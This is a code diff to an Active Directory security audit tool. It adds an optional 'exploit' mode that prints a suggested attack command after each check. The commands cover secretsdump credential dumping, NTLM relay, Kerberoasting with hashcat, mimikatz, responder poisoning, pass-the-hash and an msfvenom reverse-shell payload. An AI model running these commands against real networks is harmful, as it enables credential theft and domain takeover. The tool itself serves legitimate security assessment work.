@@ -30,6 +30,7 @@ class ADcheck:
         self.output = options.output
         self.is_admin = options.is_admin
         self.debug = options.debug
+        self.exploit = options.exploit
         self.report_results = []
         self.report_tables = []
         self.console = Console()
@@ -77,7 +78,7 @@ class ADcheck:
         self.NEW_WELL_KNOWN_SIDS = {key.replace('domain-', self.domain_sid): value for key, value in WELL_KNOWN_SIDS.items()}
         self.PRIVESC_GROUP = {key.replace('domain', self.domain_sid): value for key, value in PRIVESC_GROUP.items()}
 
-    def pprint(self, result, message, reverse=False, display=True):
+    def pprint(self, result, message, reverse=False):
         import sys
 
         name = sys._getframe(1).f_code.co_name
@@ -86,11 +87,13 @@ class ADcheck:
         color = color_code.get('black') if result == 'INFO' else (color_code.get('red') if (result and not reverse) or (not result and reverse) else color_code.get('green'))
         term_color = ansi_color_code.get('black') if result == 'INFO' else (ansi_color_code.get('red') if (result and not reverse) or (not result and reverse) else ansi_color_code.get('green'))
 
-        if display:
-            if result == 'INFO':
-                print(message)
-            else:
-                print(f"{term_color}{message}{ansi_color_code.get('default')}")
+        if result == 'INFO':
+            print(message)
+        elif result == 'EXPLOIT':
+            if self.exploit:
+                print(f"\033[90mExploit: {message}\033[0m")
+        else:
+            print(f"{term_color}{message}{ansi_color_code.get('default')}")
 
         if self.output:
             self.report_results.append({"name": name, "color": color, "message": message})
@@ -115,6 +118,8 @@ class ADcheck:
     async def can_add_computer(self):
         result = self.root_entry.get('ms-DS-MachineAccountQuota')
         self.pprint(result, f'Non-admin users can add up to {result} computer(s) to a domain')
+        self.pprint('EXPLOIT', 'impacket-addcomputer -computer-name "fakehost$" -computer-pass "password" "domain/user:password" -dc-ip dc_ip')
+
 
     async def accounts_never_expire(self):
         password_unexpire = []
@@ -126,6 +131,7 @@ class ADcheck:
         if len(password_unexpire) > 50:
             result = True
         self.pprint(result, f'Number of accounts which have never expiring passwords : {len(password_unexpire)}')
+        self.pprint('EXPLOIT', f'https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials\n{'':9}https://www.netexec.wiki/smb-protocol/password-spraying')
 
     async def native_admin_logon(self):
         for user in self.user_entries:
@@ -138,6 +144,7 @@ class ADcheck:
         if ndays < 30:
             result = True
         self.pprint(result, f'The native administrator account has been used recently : {ndays} day(s) ago')
+        self.pprint('EXPLOIT', 'bash seth.sh eth0 <ATTACKER IP> <ADMIN IP> <DC IP>')
 
     async def admin_can_be_delegated(self):
         result = []
@@ -150,6 +157,7 @@ class ADcheck:
         group = (await self.ad_client.msldap_client.get_dn_for_objectsid(f'{self.domain_sid.rstrip("-")}-518'))[0]
         result = [member.sAMAccountName async for member, e in self.ad_client.msldap_client.get_group_members(group)]
         self.pprint(result, f'Accounts in Schema Admins group : {result}')
+        self.pprint('EXPLOIT', 'https://www.thehacker.recipes/ad/movement/builtins/security-groups')
 
     async def admin_not_protected(self):
         result = []
@@ -163,6 +171,7 @@ class ADcheck:
                 if not is_protected_user:
                     result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Admin accounts not in Protected Users group : {result}')
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     async def ldap_signing(self):
         from ldap3.core.exceptions import LDAPBindError
@@ -179,6 +188,7 @@ class ADcheck:
         finally:
             if ad_client:
                 await ad_client.disconnect()
+        self.pprint('EXPLOIT', 'impacket-ntlmrelayx -t ldap://dc_ip --escalate-user user')
 
     async def channel_binding(self):
         ad_client = ADClient(domain=self.domain, url=self.url.replace(self.url.split('+')[0], 'ldaps'))
@@ -196,12 +206,14 @@ class ADcheck:
                 self.pprint(True, f'Channel binding enforced : False')
         finally:
             await ad_client.disconnect()
+        self.pprint('EXPLOIT', 'impacket-ntlmrelayx -t ldap://dc_ip --escalate-user user')
 
     async def pre2000_group(self):
         group_entries = await self.ad_client.get_ADobjects(custom_filter='(objectClass=group)')
         members = [group.get('member') for group in group_entries if group.get('objectSid') == 'S-1-5-32-554'][0]
         result = any('S-1-5-11' in user for user in (members or []))
         self.pprint(result, f'Pre-Windows 2000 Compatible Access group members contain "Authenticated Users : {result}')
+        self.pprint('EXPLOIT', 'nxc smb dc_ip -u "user" -p "password" --users')
 
     async def privesc_group(self):
         result = {}
@@ -231,6 +243,7 @@ class ADcheck:
                 report_rows.append([group_dn, "-"])
 
         self.console.print(table)
+        self.pprint('EXPLOIT', 'https://www.thehacker.recipes/ad/movement/builtins/security-groups')
 
         self.report_tables.append({
             'title': 'Privesc Groups',
@@ -248,6 +261,7 @@ class ADcheck:
         if ndays > 40:
             result = True
         self.pprint(result, f'Kerberos password last changed : {ndays} day(s) ago')
+        self.pprint('EXPLOIT', f'impacket-ticketer -aesKey aes_key -domain-sid sid -domain domain -dc-ip dc_ip user\n{'':9}export KRB5CCNAME=ticket_path; impacket-secretsdump -k dc')
 
     # async def spooler(self):
     #     from impacket.dcerpc.v5 import transport, rprn
@@ -278,6 +292,7 @@ class ADcheck:
             if 'ENCRYPTED_TEXT_PASSWORD_ALLOWED' in msuaccalc(user.get('userAccountControl')):
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts which have reversible passwords : {result}')
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     async def inactive_accounts(self):
         result = []
@@ -294,6 +309,7 @@ class ADcheck:
             if ndays >= 90:
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Number of inactive accounts: {len(result)}')
+        self.pprint('EXPLOIT', f'https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials\n{'':9}https://www.netexec.wiki/smb-protocol/password-spraying')
 
     async def locked_accounts(self):
         naccounts = []
@@ -311,6 +327,7 @@ class ADcheck:
             if 'USE_DES_KEY_ONLY' in msuaccalc(user.get('userAccountControl')):
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts which can use des authentication : {result}')
+        self.pprint('EXPLOIT', f'nxc ldap dc_ip -u "user" -p "password" --kerberoast hashes.txt\n{'':9}hashcat -a 0 -m 7500 hashes.txt dict.txt')
 
     async def asreproast(self):
         result = []
@@ -318,6 +335,7 @@ class ADcheck:
             if 'DONT_REQ_PREAUTH' in msuaccalc(user.get('userAccountControl')):
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts vulnerable to asreproasting attack : {result}')
+        self.pprint('EXPLOIT', f'nxc ldap dc_ip -u "user" -p "password" --asreproast hashes.txt\n{'':9}hashcat -a 0 -m 18200 hashes.txt dict.txt')
 
     async def kerberoast(self):
         result = []
@@ -325,6 +343,7 @@ class ADcheck:
             if 'servicePrincipalName' in user and user.get('cn') != 'krbtgt':
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts vulnerable to kerberoasting attack : {result}')
+        self.pprint('EXPLOIT', f'nxc ldap dc_ip -u "user" -p "password" --kerberoast hashes.txt\n{'':9}hashcat -a 0 -m 13100 hashes.txt dict.txt')
 
     async def trusted_for_delegation(self):
         users = []
@@ -339,6 +358,7 @@ class ADcheck:
 
         result = users + computers
         self.pprint(result, f'Trust accounts for the delegation : {result}')
+        self.pprint('EXPLOIT', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained')
 
     async def password_not_required(self):
         guest_dn = (await self.ad_client.msldap_client.get_dn_for_objectsid(f'{self.domain_sid.rstrip("-")}-501'))[0]
@@ -350,6 +370,7 @@ class ADcheck:
                 if user.get('sAMAccountName') != guest:
                     result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts with password not required : {result}')
+        self.pprint('EXPLOIT', 'nxc smb dc_ip -u "user" -p "" --shares')
 
     @admin_required
     async def ntds_dump(self):
@@ -378,15 +399,22 @@ class ADcheck:
     @admin_required
     async def identical_password(self):
         ntds = await self.ntds_dump()
-        hash_counts = {}
+        hash_to_users = {}
 
         for entry in ntds:
-            hash = entry.get('nt')
-            if hash:
-                hash_counts[hash] = hash_counts.get(hash, 0) + 1
+            nt_hash = entry.get('nt')
+            username = entry.get('username')
+            if nt_hash and username:
+                hash_to_users.setdefault(nt_hash, set()).add(username)
 
-        result = sum(1 for cpt in hash_counts.values() if cpt > 1)
+        result = sum(len(users) for users in hash_to_users.values() if len(users) > 1)
         self.pprint(result, f'Number of accounts with identical password : {result}')
+
+        if self.debug:
+            for nt_hash, users in hash_to_users.items():
+                if len(users) > 1:
+                    self.pprint('INFO', f'NT hash {nt_hash} shared by: {", ".join(sorted(users))}')
+        self.pprint('EXPLOIT', 'hashcat -a 0 -m 1000 hashes.txt dict.txt')
 
     @admin_required
     async def blank_password(self):
@@ -402,6 +430,7 @@ class ADcheck:
             if user_hash == '31d6cfe0d16ae931b73c59d7e0c089c0' and username != guest:
                 result.append(username)
         self.pprint(result, f'Accounts with blank password : {result}')
+        self.pprint('EXPLOIT', '[LOCAL] mimikatz.exe "privilege::debug" "lsadump::sam" exit > sam.txt')
 
     async def was_admin(self):
         result = []
@@ -409,6 +438,7 @@ class ADcheck:
             if 'adminCount' in user and user.get('cn') != 'krbtgt' and user.get('objectSid') != 'S-1-5-32-544':
                 result.append(user.get('sAMAccountName'))
         self.pprint(result, f'Accounts that were an admin : {result}')
+        self.pprint('EXPLOIT', 'nxc smb dc_ip -u "user" -p "password" --sam')
 
     async def gpo_by_ou(self):
         policies = [{'name': policy.get('name'), 'displayName': policy.get('displayName')} for policy in self.policies_entries]
@@ -455,6 +485,7 @@ class ADcheck:
     async def smb_signing(self):
         result = self.smb_client.smbconn.signing_required
         self.pprint(result, f'SMB signing is required : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'impacket-ntlmrelayx -tf ip -smb2support')
 
     async def password_policy(self):
         from adcheck.modules.constants import PWD_PROPERTIES
@@ -469,6 +500,7 @@ class ADcheck:
                     'pwdProperties': PWD_PROPERTIES.get(int(self.root_entry.get('pwdProperties')))
                 }
         self.pprint('INFO', f'Default password policy :\n{json.dumps(result, indent=4)}')
+        self.pprint('EXPLOIT', f'https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials\n{'':9}https://www.netexec.wiki/smb-protocol/password-spraying')
 
     async def functional_level(self):
         from adcheck.modules.constants import FOREST_LEVELS
@@ -484,6 +516,7 @@ class ADcheck:
         result, e = await self.ad_client.add_DNSentry(domain=self.domain, hostname='fakehost', ip='7.7.7.7')
         # await self.ad_client.del_DNSentry(domain=self.domain, hostname='fakehost')
         self.pprint(result, f'User can create dns record : {result}')
+        self.pprint('EXPLOIT', '[https://github.com/dirkjanm/krbrelayx] python3 dnstool.py -u "domain\\user" -p "password" --record "fakehost" --action add --data ip dc_ip')
 
     async def auth_attributes(self):
         attributes = ['altSecurityIdentities', 'userPassword', 'unixUserPassword', 'unicodePwd', 'msDS-HostServiceAccount']
@@ -493,8 +526,10 @@ class ADcheck:
             for user in self.user_entries:
                 if attribute in user:
                     users_attribute[attribute].append(user.get('sAMAccountName'))
+        self.pprint('INFO','Summary of sensitive attributes:')
         for attribute, result in users_attribute.items():
-            self.pprint(result, f'Accounts with {attribute} attributes: {result}')
+            self.pprint(result, f'{'':5}Accounts with {attribute} attributes: {result}')
+        self.pprint('EXPLOIT', 'bloodyad -u "user" -p "password" --host dc_ip -d domain get object "account" --attr altSecurityIdentities,userPassword,unicodePwd,msDS-ManagedPassword')
 
     @admin_required
     async def laps(self):
@@ -508,6 +543,7 @@ class ADcheck:
                     result = True
                     break
             self.pprint(result, f'LAPS is installed : {result}', reverse=True)
+            self.pprint('EXPLOIT', 'nxc smb ip -u user -p password --laps')
 
     async def pso(self):
         pso = await self.ad_client.get_ADobjects(custom_filter='(objectClass=msDS-PasswordSettings)')
@@ -533,6 +569,8 @@ class ADcheck:
                     }
                 )
         self.pprint('INFO', f'Password Settings Object :\n{json.dumps(result, indent=4)}')
+        self.pprint('EXPLOIT', f'https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials\n{'':9}https://www.netexec.wiki/smb-protocol/password-spraying')
+
 
     async def supported_encryption(self):
         dcs = await self.domain_controlers(_return=True)
@@ -547,13 +585,15 @@ class ADcheck:
             if 'msDS-AllowedToDelegateTo' in computer:
                 result.append(f"{computer.get('sAMAccountName')}: {computer.get('msDS-AllowedToDelegateTo')}")
         self.pprint(result, f'Computers with constrained delegation : {json.dumps(result, indent=4)}')
+        self.pprint('EXPLOIT', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained')
 
-    async def rbac(self):
+    async def rbcd(self):
         result = []
         for computer in self.computer_entries:
             if 'msDS-AllowedToActOnBehalfOfOtherIdentity' in computer:
                 result.append(computer.get('sAMAccountName'))
-        self.pprint(result, f'Computers with rbac :{result}')
+        self.pprint(result, f'Computers with rbcd :{result}')
+        self.pprint('EXPLOIT', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd')
 
     async def gMSA(self):
         gMSAs = await self.ad_client.get_ADobjects(custom_filter='(objectClass=msDS-GroupManagedServiceAccount)')
@@ -563,6 +603,7 @@ class ADcheck:
              for gMSA in gMSAs:
                 result.append({'dn': gMSA.get('distinguishedName'), 'msDS-HostServiceAccountBL': gMSA.get('msDS-HostServiceAccountBL'), 'msDS-ManagedPasswordInterval': gMSA.get('msDS-ManagedPasswordInterval')})
         self.pprint('INFO', f'Group Managed Service Accounts : {json.dumps(result, indent=4)}')
+        self.pprint('EXPLOIT', 'nxc ldap dc_ip -u "user" -p "password" --gmsa')
 
     async def silos(self):
         authn_container = await self.ad_client.get_ADobjects(custom_base_dn=f'CN=AuthN Policy Configuration,CN=Services,CN=Configuration,{self.base_dn}', custom_filter='(objectClass=*)')
@@ -635,8 +676,8 @@ class ADcheck:
             sd_parser = SDDLParser()
             sd_parser.parse(security_descriptor.to_sddl())
             sd_parser.to_rich(console=self.console, title=dn, sensitive_trustee=True, debug=self.debug)
-
-    # NOTE: BLOODHOUND DO THAT
+        
+        self.pprint('EXPLOIT', 'nxc ldap dc_ip -u "user" -p "password" --bloodhound -c all')
 
     async def krbtgt_encryption(self):
         encryption_type = int((await self.ad_client.get_ADobjects(custom_base_dn=f'CN=krbtgt,CN=Users,{self.base_dn}'))[0].get('msDS-SupportedEncryptionTypes'))
@@ -650,6 +691,7 @@ class ADcheck:
             for computer in recovery_information:
                 result.append(str(computer.get('distinguishedName')).split(','))
         self.pprint('INFO', f'Computers with bitlocker keys : {result}')
+        self.pprint('EXPLOIT', '[https://github.com/p0dalirius/ExtractBitlockerKeys] python ExtractBitlockerKeys.py -d "domain" -u "user" -p "password" --dc-ip "dc_ip"')
 
     async def gpp_password(self):
         result = []
@@ -661,6 +703,7 @@ class ADcheck:
                         if entry == policy.get('cn'):
                             result.append(policy.get('displayName'))
         self.pprint(result, f'Group Policy containing a password : {result}')
+        self.pprint('EXPLOIT', 'nxc smb dc_ip -u "user" -p "password" -M gpp_password')
 
     async def timeroast(self):
         computers_noLogonCount = [computer.get('sAMAccountName') for computer in (await self.ad_client.get_ADobjects(custom_filter='(&(userAccountControl=4128)(logonCount=0))')) or []]
@@ -674,6 +717,7 @@ class ADcheck:
                 if 'NTStatus.NOLOGON_WORKSTATION_TRUST_ACCOUNT' in str(e):
                     result.append(computer)
         self.pprint(result, f'Accounts vulnerable to timeroasting attack : {result}')
+        self.pprint('EXPLOIT', 'nxc smb dc_ip -u "user" -p "password" -M timeroast')
 
     async def kerberos_hardened(self):
         result = {}
@@ -750,6 +794,7 @@ class ADcheck:
             'rows': report_rows,
             'category': 'privilege'
         })
+        self.pprint('EXPLOIT', 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html')
 
     async def policies_ace(self):
         unc_path = rf'\\{self.dc_ip}\sysvol\{self.domain}\Policies'
@@ -763,6 +808,7 @@ class ADcheck:
             title = f"\n[bold yellow]{display_path}[/bold yellow]\n"
 
             sd_parser.to_rich(console=self.console, title=title, sensitive_trustee=True, sensitive_rights=True, debug=self.debug)
+        self.pprint('EXPLOIT', '[https://github.com/Hackndo/pyGPOAbuse] python3 pygpoabuse.py "domain/user:password" -dc-ip dc_ip -gpo-id gpo_id')
 
     async def users_description(self):
         result = []
@@ -770,6 +816,7 @@ class ADcheck:
             if 'description' in user and not self.NEW_WELL_KNOWN_SIDS.get(user.get('objectSid')):
                 result.append(user.get('sAMAccountName'))
         self.pprint('INFO', f'Users with description : {result}')
+        self.pprint('EXPLOIT', 'ldapdomaindump -u "domain\\user" -p "password" --no-grep --no-json dc_ip')
 
     # async def namedpipes(self):
     #     result = [pipe.get_longname() for pipe in self.smb_client.listPath('IPC$', r'\\*')]
@@ -782,6 +829,7 @@ class ADcheck:
         conn = Connection(Server(f'ldap://{self.dc_ip}', get_info=ALL), authentication=ANONYMOUS)
         result = conn.bind() and conn.search(self.base_dn, '(objectClass=*)', attributes=['*']) and bool(conn.entries)
         self.pprint(result, f'Ldap anonymous bind : {result}')
+        self.pprint('EXPLOIT', 'ldapdomaindump --no-grep --no-json dc_ip')
 
     async def dfsr(self):
         msDFSR_flags = (await self.ad_client.get_ADobjects(custom_base_dn=f'CN=DFSR-GlobalSettings,CN=System,{self.base_dn}', custom_filter='(objectClass=msDFSR-GlobalSettings)'))[0].get('msDFSR-Flags')
@@ -803,6 +851,7 @@ class ADcheck:
                 title = f"\n[bold yellow][+] Listing ACL for share:[/bold yellow] {obj.unc_path}\n"
 
                 sd_parser.to_rich(console=self.console, title=title, sensitive_trustee=True, debug=self.debug)
+        self.pprint('EXPLOIT', '[https://github.com/blacklanternsecurity/MANSPIDER] python3 manspider ip -f "words" -d domain -u "user" -p "password"')
 
     @admin_required
     async def wmi_last_update(self):
@@ -814,6 +863,7 @@ class ADcheck:
 
         result = ndays < 30
         self.pprint(result, f'The computer is up to date (Last : {last_update}) : {result}', reverse=True)
+        self.pprint('EXPLOIT', '[https://github.com/bitsadmin/wesng] python3 wes.py systeminfo.txt -cde')
 
     @admin_required
     async def wmi_last_backup(self):
@@ -911,15 +961,15 @@ class ADcheck:
             title = f"\n[bold yellow]{reg_key}[/bold yellow]\n"
 
             sd_parser.to_rich(console=self.console, title=title)
+        self.pprint('EXPLOIT', 'nxc smb ip -u "user" -p "password" --local-auth --sam')
 
     @admin_required
     async def reg_uac(self):
-        hives = {
-            'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA': 1,
-            # 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy': 0
-        }
-        result = await self.reg_client.check_values(hives)
+        EnableLUA = await self.reg_client.read_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA')
+        LocalAccountTokenFilterPolicy = await self.reg_client.read_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy')
+        result = (EnableLUA == 1 and (LocalAccountTokenFilterPolicy == 0 or not LocalAccountTokenFilterPolicy))
         self.pprint(result, f'UAC configuration is secure : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'nxc smb ip -u "user" -p "password" --local-auth --sam')
 
     @admin_required
     async def reg_LMHASH(self):
@@ -928,6 +978,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'LM hash storage disabled : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'nxc smb ip -u "user" -p "password" --sam')
     
     @admin_required
     async def reg_NTLMv2(self):
@@ -936,6 +987,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'Authentication limited to NTLMv2 mechanism only : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'responder -I eth0 -v --lm --disable-ess')
     
     @admin_required  
     async def reg_AlwaysInstallElevated(self):
@@ -944,6 +996,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'MSI packages are always installed with elevated privileges : {result}')
+        self.pprint('EXPLOIT', '/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f msi -o payload.msi')
     
     @admin_required  
     async def reg_ipv4_only(self):
@@ -952,6 +1005,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'IPv4 preferred over IPv6 : {result}', reverse=True)
+        self.pprint('EXPLOIT', f'mitm6 -i eth0 -d domain\n{'':9}responder -I eth0 -v') 
 
     @admin_required
     async def reg_wdigest(self):
@@ -960,6 +1014,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'WDigest authentication enabled : {result}')
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     @admin_required
     async def reg_lsa_cache(self):
@@ -971,6 +1026,7 @@ class ADcheck:
             self.pprint(result, f'Too many logons are kept in the LSA cache : {result}')
         except AttributeError :
             self.pprint(True, 'LSA cache length is not defined')
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     @admin_required
     async def reg_wsus_config(self):
@@ -982,6 +1038,7 @@ class ADcheck:
             self.pprint(result, f'WSUS configuration is secure : {result}', reverse=True)
         except AttributeError :
             self.pprint(True, 'WSUS server is not used')
+            self.pprint('EXPLOIT', '[https://github.com/NeffIsBack/wsuks] wsuks -t ip --wsus-server wsus_ip')
 
     @admin_required
     async def reg_rdp_timeout(self):
@@ -1003,6 +1060,7 @@ class ADcheck:
         ]
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'CredentialGuard is enabled : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     @admin_required  
     async def reg_lsass_ppl(self):
@@ -1012,6 +1070,7 @@ class ADcheck:
         ]
         result = await self.reg_client.check_values(hives, any_match=True)
         self.pprint(result, f'Lsass runs as a protected process : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'impacket-secretsdump "domain/user:password@ip"')
 
     @admin_required  
     async def reg_pwsh2(self):
@@ -1028,6 +1087,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'RDP use NLA : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'bash seth.sh eth0 <ATTACKER IP> <ADMIN IP> <DC IP>')
 
     @admin_required  
     async def reg_rdp_nopth(self):
@@ -1038,6 +1098,7 @@ class ADcheck:
         ]
         result = await self.reg_client.check_values(hives, any_match=True)
         self.pprint(result, f'RDP is secured over pass the hash attack : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'xfreerdp /u:user /pth:hash /v:ip /cert:ignore')
 
     @admin_required  
     async def reg_pwsh_restricted(self):
@@ -1056,6 +1117,7 @@ class ADcheck:
         }
         result = any([all([await self.reg_client.read_value(key) == value for key in keys]) for keys, value in hives.items()])
         self.pprint(result, f'Bitlocker is enabled : {result}', reverse=True)
+        self.pprint('EXPLOIT', '[https://github.com/p0dalirius/ExtractBitlockerKeys] python ExtractBitlockerKeys.py -d domain -u "user" -p "password" --dc-ip dc_ip')
 
     @admin_required  
     async def reg_llmnr(self):
@@ -1065,6 +1127,7 @@ class ADcheck:
         ]
         result = await self.reg_client.check_values(hives, any_match=True)
         self.pprint(result, f'LLMNR, NetBIOS or mDNS is disabled : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'responder -I eth0 -v')
 
     @admin_required  
     async def reg_applocker(self):
@@ -1085,6 +1148,7 @@ class ADcheck:
         }
         result = await self.reg_client.check_values(hives)
         self.pprint(result, f'gpp_autologon is enabled : {result}')
+        self.pprint('EXPLOIT', 'nxc smb ip -u "user" -p "password" -M gpp_autologin')
 
     @admin_required  
     async def reg_wpad(self):
@@ -1094,6 +1158,7 @@ class ADcheck:
         ]
         result = await self.reg_client.check_values(hives, any_match=True)
         self.pprint(result, f'WPAD is disabled : {result}', reverse=True)
+        self.pprint('EXPLOIT', 'responder -I eth0 -vw')
 
     @admin_required
     async def reg_wsh(self):
@@ -1163,6 +1228,7 @@ class ADcheck:
             }
         }
         self.pprint('INFO', f"WSManConfig :\n{json.dumps(result, indent=4)}")
+        self.pprint('EXPLOIT', '[https://github.com/adityatelange/evil-winrm-py] python3 evil-winrm-py -i ip -u "user" -p "password"')
 
 class Options:
     def __init__(self):
@@ -1171,3 +1237,4 @@ class Options:
         self.output = False
         self.is_admin = False
         self.debug = False
+        self.exploit = False
